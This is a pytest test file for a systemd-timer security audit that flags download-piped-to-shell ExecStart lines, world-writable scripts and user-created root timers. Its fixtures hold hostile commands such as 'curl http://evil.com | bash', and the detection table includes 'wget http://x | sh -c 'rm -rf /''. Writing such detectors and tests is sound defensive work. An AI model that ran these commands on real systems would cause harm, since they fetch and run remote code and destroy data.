"""Tests for systemd timers security audit (CHECK 44)."""

from __future__ import annotations

from pathlib import Path
from unittest.mock import patch

import pytest

from bob.checks._run import CommandResult
from bob.checks.systemd_timers import (
    SystemdTimersSnapshot,
    _find_service_file,
    _is_world_writable,
    _list_timer_units,
    _parse_service_file,
    check_systemd_timers,
)
from bob.scoring import FindingLevel


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _snap(
    pipe_to_shell: list[str] | None = None,
    world_writable: list[str] | None = None,
    user_root: list[str] | None = None,
    timer_count: int = 5,
    systemctl: bool = True,
) -> SystemdTimersSnapshot:
    return SystemdTimersSnapshot(
        pipe_to_shell_entries=pipe_to_shell or [],
        world_writable_scripts=world_writable or [],
        user_created_root_timers=user_root or [],
        timer_count=timer_count,
        systemctl_available=systemctl,
    )


def _get_finding(result, key):
    return next(f for f in result.findings if f.key == key)


# ---------------------------------------------------------------------------
# TestCheckSystemdTimers — pure logic
# ---------------------------------------------------------------------------

class TestCheckSystemdTimers:
    def test_no_systemctl_returns_info(self):
        result = check_systemd_timers(_snap(systemctl=False))
        f = _get_finding(result, "systemd_timers.no_systemctl")
        assert f.level == FindingLevel.INFO

    def test_no_timers_returns_info(self):
        result = check_systemd_timers(_snap(timer_count=0))
        f = _get_finding(result, "systemd_timers.no_timers")
        assert f.level == FindingLevel.INFO

    def test_all_clean_returns_ok(self):
        result = check_systemd_timers(_snap())
        f = _get_finding(result, "systemd_timers.ok")
        assert f.level == FindingLevel.OK

    def test_pipe_to_shell_warn(self):
        result = check_systemd_timers(_snap(pipe_to_shell=["mytimer.timer: curl http://x | bash"]))
        f = _get_finding(result, "systemd_timers.pipe_to_shell")
        assert f.level == FindingLevel.WARN

    def test_pipe_to_shell_deducts_2pts(self):
        result = check_systemd_timers(_snap(pipe_to_shell=["mytimer.timer: curl http://x | bash"]))
        assert sum(d.points for d in result.deductions) == 2

    def test_world_writable_warn(self):
        result = check_systemd_timers(_snap(world_writable=["/opt/backup.sh"]))
        f = _get_finding(result, "systemd_timers.world_writable")
        assert f.level == FindingLevel.WARN

    def test_world_writable_deducts_1pt(self):
        result = check_systemd_timers(_snap(world_writable=["/opt/backup.sh"]))
        assert sum(d.points for d in result.deductions) == 1

    def test_user_created_root_info_only(self):
        result = check_systemd_timers(_snap(user_root=["backup.timer"]))
        f = _get_finding(result, "systemd_timers.user_created_root")
        assert f.level == FindingLevel.INFO
        assert not result.deductions

    def test_pipe_and_writable_combined(self):
        result = check_systemd_timers(_snap(
            pipe_to_shell=["t.timer: wget http://x | sh"],
            world_writable=["/etc/scripts/run.sh"],
        ))
        assert sum(d.points for d in result.deductions) == 3

    def test_pipe_to_shell_no_ok_finding(self):
        result = check_systemd_timers(_snap(pipe_to_shell=["t.timer: curl http://x | bash"]))
        assert not any(f.level == FindingLevel.OK for f in result.findings)

    def test_long_exec_start_truncated_in_detail(self):
        """ExecStart strings longer than _MAX_EXEC_LENGTH must be truncated in the detail."""
        from bob.checks.systemd_timers import _MAX_EXEC_LENGTH
        long_cmd = "curl http://evil.com/" + "x" * 400 + " | bash"
        snap = SystemdTimersSnapshot(
            pipe_to_shell_entries=[f"t.timer: {long_cmd[:_MAX_EXEC_LENGTH]}…"],
            timer_count=1,
        )
        result = check_systemd_timers(snap)
        f = _get_finding(result, "systemd_timers.pipe_to_shell")
        detail = f.detail or ""
        assert len(detail) < len(long_cmd) + 200

    def test_multiple_pipe_entries_consolidated_into_one_finding(self):
        """Multiple pipe-to-shell timers must produce exactly one finding, not one per timer."""
        result = check_systemd_timers(_snap(pipe_to_shell=[
            "a.timer: curl http://x | bash",
            "b.timer: wget http://y | sh",
        ]))
        pipe_findings = [f for f in result.findings if f.key == "systemd_timers.pipe_to_shell"]
        assert len(pipe_findings) == 1

    def test_multiple_world_writable_consolidated_into_one_finding(self):
        """Multiple world-writable scripts must produce exactly one finding."""
        result = check_systemd_timers(_snap(world_writable=[
            "/opt/alpha.sh", "/opt/beta.sh",
        ]))
        ww_findings = [f for f in result.findings if f.key == "systemd_timers.world_writable"]
        assert len(ww_findings) == 1


class TestCheckSystemdTimersTranslation:
    def test_t_called_for_pipe_to_shell(self):
        calls = []

        def _t(key, **kwargs):
            calls.append(key)
            return key

        check_systemd_timers(_snap(pipe_to_shell=["t.timer: curl http://x | sh"]), t=_t)
        assert "systemd_timers.pipe_to_shell" in calls

    def test_t_called_for_ok(self):
        calls = []

        def _t(key, **kwargs):
            calls.append(key)
            return key

        check_systemd_timers(_snap(), t=_t)
        assert "systemd_timers.ok" in calls


# ---------------------------------------------------------------------------
# TestListTimerUnits
# ---------------------------------------------------------------------------

class TestListTimerUnits:
    SAMPLE_OUTPUT = """\
NEXT                         LEFT         LAST                         PASSED    UNIT                         ACTIVATES
Mon 2026-04-20 00:00:00 UTC  10h left     Sun 2026-04-19 00:00:00 UTC  13h ago   logrotate.timer              logrotate.service
Mon 2026-04-20 06:15:00 UTC  16h left     Sun 2026-04-19 06:18:00 UTC  7h ago    apt-daily-upgrade.timer      apt-daily-upgrade.service
Fri 2026-04-24 00:00:00 UTC  4 days left  n/a                          n/a       e2scrub_all.timer            e2scrub_all.service
3 timers listed.
"""

    def test_parses_timer_names(self):
        with patch("bob.checks.systemd_timers.run_result", return_value=CommandResult(self.SAMPLE_OUTPUT, True)):
            units, _ = _list_timer_units()
        names = [u[0] for u in units]
        assert "logrotate.timer" in names
        assert "apt-daily-upgrade.timer" in names
        assert "e2scrub_all.timer" in names

    def test_parses_service_names(self):
        with patch("bob.checks.systemd_timers.run_result", return_value=CommandResult(self.SAMPLE_OUTPUT, True)):
            units, _ = _list_timer_units()
        by_timer = {u[0]: u[1] for u in units}
        assert by_timer["logrotate.timer"] == "logrotate.service"
        assert by_timer["apt-daily-upgrade.timer"] == "apt-daily-upgrade.service"

    def test_derives_service_when_missing(self):
        out = "  custom.timer  loaded active\n"
        with patch("bob.checks.systemd_timers.run_result", return_value=CommandResult(out, True)):
            units, _ = _list_timer_units()
        assert ("custom.timer", "custom.service") in units

    def test_ambiguous_line_uses_last_service(self):
        """When a line contains multiple .service tokens, the last one wins (ACTIVATES column)."""
        out = "  foo.timer  other.service  foo.service\n"
        with patch("bob.checks.systemd_timers.run_result", return_value=CommandResult(out, True)):
            units, _ = _list_timer_units()
        by_timer = {u[0]: u[1] for u in units}
        assert by_timer["foo.timer"] == "foo.service"

    def test_empty_output(self):
        with patch("bob.checks.systemd_timers.run_result", return_value=CommandResult("", True)):
            assert _list_timer_units() == ([], True)

    def test_no_duplicates(self):
        out = "  dup.timer  dup.service\n  dup.timer  dup.service\n"
        with patch("bob.checks.systemd_timers.run_result", return_value=CommandResult(out, True)):
            units, _ = _list_timer_units()
        assert len([u for u in units if u[0] == "dup.timer"]) == 1

    def test_large_output_does_not_crash(self):
        """Parsing 200 timer lines must complete without error."""
        lines = [f"  timer{i}.timer  timer{i}.service\n" for i in range(200)]
        out = "".join(lines)
        with patch("bob.checks.systemd_timers.run_result", return_value=CommandResult(out, True)):
            units, _ = _list_timer_units()
        assert len(units) == 200


# ---------------------------------------------------------------------------
# TestFindServiceFile
# ---------------------------------------------------------------------------

class TestFindServiceFile:
    def test_finds_etc_first(self, tmp_path):
        etc_dir = tmp_path / "etc" / "systemd" / "system"
        lib_dir = tmp_path / "lib" / "systemd" / "system"
        etc_dir.mkdir(parents=True)
        lib_dir.mkdir(parents=True)
        etc_svc = etc_dir / "custom.service"
        lib_svc = lib_dir / "custom.service"
        etc_svc.write_text("[Service]")
        lib_svc.write_text("[Service]")

        import bob.checks.systemd_timers as mod
        orig_dirs = mod._SERVICE_DIRS
        mod._SERVICE_DIRS = [etc_dir, lib_dir]
        try:
            result = _find_service_file("custom.service")
        finally:
            mod._SERVICE_DIRS = orig_dirs

        assert result == etc_svc

    def test_returns_none_when_not_found(self, tmp_path):
        import bob.checks.systemd_timers as mod
        orig_dirs = mod._SERVICE_DIRS
        mod._SERVICE_DIRS = [tmp_path / "nonexist"]
        try:
            result = _find_service_file("ghost.service")
        finally:
            mod._SERVICE_DIRS = orig_dirs
        assert result is None


# ---------------------------------------------------------------------------
# TestParseServiceFile
# ---------------------------------------------------------------------------

class TestParseServiceFile:
    def test_extracts_exec_start(self, tmp_path):
        svc = tmp_path / "test.service"
        svc.write_text("[Service]\nExecStart=/usr/bin/backup.sh\n")
        exec_starts, has_user = _parse_service_file(svc)
        assert exec_starts == ["/usr/bin/backup.sh"]
        assert not has_user

    def test_detects_user_directive(self, tmp_path):
        svc = tmp_path / "test.service"
        svc.write_text("[Service]\nUser=backup\nExecStart=/usr/bin/backup.sh\n")
        _, has_user = _parse_service_file(svc)
        assert has_user

    def test_multiple_exec_start(self, tmp_path):
        svc = tmp_path / "test.service"
        svc.write_text("[Service]\nExecStart=/usr/bin/a.sh\nExecStart=/usr/bin/b.sh\n")
        exec_starts, _ = _parse_service_file(svc)
        assert len(exec_starts) == 2

    def test_missing_file_returns_empty(self, tmp_path):
        exec_starts, has_user = _parse_service_file(tmp_path / "ghost.service")
        assert exec_starts == []
        assert not has_user

    def test_pipe_to_shell_in_exec_start(self, tmp_path):
        svc = tmp_path / "test.service"
        svc.write_text('[Service]\nExecStart=/bin/bash -c "curl http://evil.com | bash"\n')
        exec_starts, _ = _parse_service_file(svc)
        assert any("curl" in e for e in exec_starts)

    def test_exec_start_with_arguments(self, tmp_path):
        """Arguments after the binary must be included in exec_starts."""
        svc = tmp_path / "test.service"
        svc.write_text("[Service]\nExecStart=/usr/bin/python3 /opt/script.py --flag\n")
        exec_starts, _ = _parse_service_file(svc)
        assert exec_starts == ["/usr/bin/python3 /opt/script.py --flag"]

    def test_exec_start_minus_prefix_stripped(self, tmp_path):
        """ExecStart=-/bin/cleanup.sh (ignore-fail prefix) must have '-' stripped."""
        svc = tmp_path / "test.service"
        svc.write_text("[Service]\nExecStart=-/bin/cleanup.sh\n")
        exec_starts, _ = _parse_service_file(svc)
        assert exec_starts == ["/bin/cleanup.sh"]

    def test_exec_start_at_prefix_stripped(self, tmp_path):
        """ExecStart=@/bin/weird.sh (argv0 override prefix) must have '@' stripped."""
        svc = tmp_path / "test.service"
        svc.write_text("[Service]\nExecStart=@/bin/weird.sh\n")
        exec_starts, _ = _parse_service_file(svc)
        assert exec_starts == ["/bin/weird.sh"]

    def test_service_without_exec_start(self, tmp_path):
        """[Service] block with no ExecStart must return empty list without crashing."""
        svc = tmp_path / "test.service"
        svc.write_text("[Service]\nType=oneshot\n")
        exec_starts, has_user = _parse_service_file(svc)
        assert exec_starts == []
        assert not has_user

    def test_user_root_sets_has_user(self, tmp_path):
        """User=root is still a non-empty User= directive → has_user must be True."""
        svc = tmp_path / "test.service"
        svc.write_text("[Service]\nUser=root\nExecStart=/opt/myapp.sh\n")
        _, has_user = _parse_service_file(svc)
        assert has_user


# ---------------------------------------------------------------------------
# TestPipeToShellDetection — two-part regex edge cases
# ---------------------------------------------------------------------------

class TestPipeToShellDetection:
    @pytest.mark.parametrize("cmd,should_match", [
        ("curl http://x | bash",                 True),
        ("curl http://x | sh",                   True),
        ("curl http://x | /bin/bash",            True),
        ("curl http://x | /bin/sh",              True),
        ("curl http://x | bash -c 'echo hi'",    True),
        ("wget http://x | sh -c 'rm -rf /'",     True),
        ("/usr/bin/backup.sh",                   False),  # no downloader
        ("cat file | bash",                      False),  # no curl/wget
        ("curl http://x > file",                 False),  # no pipe to shell
        ("curl http://x | gzip",                 False),  # pipe to non-shell
        ("wget file.tar.gz && tar xf",           False),  # no shell pipe
        # v0.15.0 — the local copy of this rule knew only sh and bash, so it
        # missed zsh, and neither copy knew about a sudo wrapper.
        ("curl http://x | zsh",                  True),
        ("curl http://x | sudo bash",            True),
        ("curl http://x | ssh host 'cmd'",       False),
    ])
    def test_detection(self, cmd, should_match):
        from bob.checks._run import pipes_into_shell
        assert pipes_into_shell(cmd) == should_match


# ---------------------------------------------------------------------------
# TestIsWorldWritable
# ---------------------------------------------------------------------------

class TestIsWorldWritable:
    def test_world_writable_file(self, tmp_path):
        f = tmp_path / "script.sh"
        f.write_text("#!/bin/bash")
        f.chmod(0o777)
        assert _is_world_writable(str(f))

    def test_non_world_writable_file(self, tmp_path):
        f = tmp_path / "script.sh"
        f.write_text("#!/bin/bash")
        f.chmod(0o755)
        assert not _is_world_writable(str(f))

    def test_nonexistent_file(self, tmp_path):
        assert not _is_world_writable(str(tmp_path / "ghost.sh"))

    def test_owner_writable_not_flagged(self, tmp_path):
        """0o600 is owner-only write — must NOT be world-writable."""
        f = tmp_path / "script.sh"
        f.write_text("#!/bin/bash")
        f.chmod(0o600)
        assert not _is_world_writable(str(f))


# ---------------------------------------------------------------------------
# TestFromSystem
# ---------------------------------------------------------------------------

class TestFromSystem:
    def test_no_systemctl_returns_empty(self):
        with patch("bob.checks.systemd_timers._command_exists", return_value=False):
            snap = SystemdTimersSnapshot.from_system()
        assert not snap.systemctl_available
        assert snap.pipe_to_shell_entries == []

    def test_detects_pipe_to_shell(self, tmp_path):
        svc = tmp_path / "evil.service"
        svc.write_text('[Service]\nExecStart=/bin/bash -c "curl http://evil.com | bash"\n')

        import bob.checks.systemd_timers as mod
        orig_dirs = mod._SERVICE_DIRS
        mod._SERVICE_DIRS = [tmp_path]
        try:
            with (
                patch("bob.checks.systemd_timers._command_exists", return_value=True),
                patch("bob.checks.systemd_timers.run_result", return_value=CommandResult("  evil.timer  evil.service\n", True)),
            ):
                snap = SystemdTimersSnapshot.from_system()
        finally:
            mod._SERVICE_DIRS = orig_dirs

        assert len(snap.pipe_to_shell_entries) == 1
        assert "evil.timer" in snap.pipe_to_shell_entries[0]

    def test_detects_world_writable_script(self, tmp_path):
        script = tmp_path / "run.sh"
        script.write_text("#!/bin/bash\necho hi")
        script.chmod(0o777)
        svc = tmp_path / "timer.service"
        svc.write_text(f"[Service]\nExecStart={script}\n")

        import bob.checks.systemd_timers as mod
        orig_dirs = mod._SERVICE_DIRS
        mod._SERVICE_DIRS = [tmp_path]
        try:
            with (
                patch("bob.checks.systemd_timers._command_exists", return_value=True),
                patch("bob.checks.systemd_timers.run_result", return_value=CommandResult("  timer.timer  timer.service\n", True)),
            ):
                snap = SystemdTimersSnapshot.from_system()
        finally:
            mod._SERVICE_DIRS = orig_dirs

        assert str(script) in snap.world_writable_scripts

    def test_user_created_root_timer(self, tmp_path):
        svc = tmp_path / "custom.service"
        svc.write_text("[Service]\nExecStart=/opt/custom.sh\n")

        import bob.checks.systemd_timers as mod
        orig_dirs = mod._SERVICE_DIRS
        mod._SERVICE_DIRS = [tmp_path]
        try:
            with (
                patch("bob.checks.systemd_timers._command_exists", return_value=True),
                patch("bob.checks.systemd_timers.run_result", return_value=CommandResult("  custom.timer  custom.service\n", True)),
            ):
                snap = SystemdTimersSnapshot.from_system()
        finally:
            mod._SERVICE_DIRS = orig_dirs

        # Only user-created (in /etc/systemd/system/) triggers the flag.
        # Since our mock dir is tmp_path (not /etc/systemd/system/), it won't trigger.
        # This test verifies the service is parsed correctly (exec_starts found).
        assert snap.timer_count == 1

    def test_timer_with_user_directive_not_flagged(self, tmp_path):
        etc_dir = tmp_path / "etc" / "systemd" / "system"
        etc_dir.mkdir(parents=True)
        svc = etc_dir / "managed.service"
        svc.write_text("[Service]\nUser=backup\nExecStart=/opt/managed.sh\n")

        import bob.checks.systemd_timers as mod
        orig_dirs = mod._SERVICE_DIRS
        mod._SERVICE_DIRS = [etc_dir]
        try:
            with (
                patch("bob.checks.systemd_timers._command_exists", return_value=True),
                patch("bob.checks.systemd_timers.run_result", return_value=CommandResult("  managed.timer  managed.service\n", True)),
            ):
                snap = SystemdTimersSnapshot.from_system()
        finally:
            mod._SERVICE_DIRS = orig_dirs

        assert "managed.timer" not in snap.user_created_root_timers

    def test_max_timers_cap_prevents_processing_beyond(self, tmp_path):
        """Services at index >= _MAX_TIMERS must not be processed even if dangerous."""
        from bob.checks.systemd_timers import _MAX_TIMERS

        for i in range(_MAX_TIMERS):
            svc = tmp_path / f"timer{i}.service"
            svc.write_text("[Service]\nExecStart=/bin/echo hello\n")

        evil_svc = tmp_path / f"timer{_MAX_TIMERS}.service"
        evil_svc.write_text('[Service]\nExecStart=/bin/bash -c "curl http://x | bash"\n')
        lines = [f"  timer{i}.timer  timer{i}.service\n" for i in range(_MAX_TIMERS + 1)]

        import bob.checks.systemd_timers as mod
        orig_dirs = mod._SERVICE_DIRS
        mod._SERVICE_DIRS = [tmp_path]
        try:
            with (
                patch("bob.checks.systemd_timers._command_exists", return_value=True),
                patch("bob.checks.systemd_timers.run_result", return_value=CommandResult("".join(lines), True)),
            ):
                snap = SystemdTimersSnapshot.from_system()
        finally:
            mod._SERVICE_DIRS = orig_dirs

        assert snap.timer_count == _MAX_TIMERS + 1
        assert not snap.pipe_to_shell_entries  # evil service was beyond the cap

    def test_script_dedup_across_timers(self, tmp_path):
        """The same world-writable script in two timers must appear only once."""
        script = tmp_path / "shared.sh"
        script.write_text("#!/bin/bash")
        script.chmod(0o777)
        for name in ("timer1.service", "timer2.service"):
            (tmp_path / name).write_text(f"[Service]\nExecStart={script}\n")

        import bob.checks.systemd_timers as mod
        orig_dirs = mod._SERVICE_DIRS
        mod._SERVICE_DIRS = [tmp_path]
        try:
            with (
                patch("bob.checks.systemd_timers._command_exists", return_value=True),
                patch("bob.checks.systemd_timers.run_result",
                      return_value=CommandResult("  timer1.timer  timer1.service\n  timer2.timer  timer2.service\n", True)),
            ):
                snap = SystemdTimersSnapshot.from_system()
        finally:
            mod._SERVICE_DIRS = orig_dirs

        assert snap.world_writable_scripts.count(str(script)) == 1

    def test_multi_exec_start_flags_if_any_dangerous(self, tmp_path):
        """If one ExecStart is safe and another is dangerous, the timer must be flagged."""
        svc = tmp_path / "mixed.service"
        svc.write_text(
            '[Service]\n'
            'ExecStart=/usr/bin/safe-script.sh\n'
            'ExecStart=/bin/bash -c "curl http://evil.com | bash"\n'
        )

        import bob.checks.systemd_timers as mod
        orig_dirs = mod._SERVICE_DIRS
        mod._SERVICE_DIRS = [tmp_path]
        try:
            with (
                patch("bob.checks.systemd_timers._command_exists", return_value=True),
                patch("bob.checks.systemd_timers.run_result", return_value=CommandResult("  mixed.timer  mixed.service\n", True)),
            ):
                snap = SystemdTimersSnapshot.from_system()
        finally:
            mod._SERVICE_DIRS = orig_dirs

        assert len(snap.pipe_to_shell_entries) == 1
        assert "mixed.timer" in snap.pipe_to_shell_entries[0]

    def test_user_root_explicit_not_in_root_timers(self, tmp_path):
        """User=root is a non-empty User= directive → timer must NOT be flagged as root timer."""
        etc_dir = tmp_path / "etc" / "systemd" / "system"
        etc_dir.mkdir(parents=True)
        svc = etc_dir / "myapp.service"
        svc.write_text("[Service]\nUser=root\nExecStart=/opt/myapp.sh\n")

        import bob.checks.systemd_timers as mod
        orig_dirs = mod._SERVICE_DIRS
        mod._SERVICE_DIRS = [etc_dir]
        try:
            with (
                patch("bob.checks.systemd_timers._command_exists", return_value=True),
                patch("bob.checks.systemd_timers.run_result", return_value=CommandResult("  myapp.timer  myapp.service\n", True)),
            ):
                snap = SystemdTimersSnapshot.from_system()
        finally:
            mod._SERVICE_DIRS = orig_dirs

        assert "myapp.timer" not in snap.user_created_root_timers
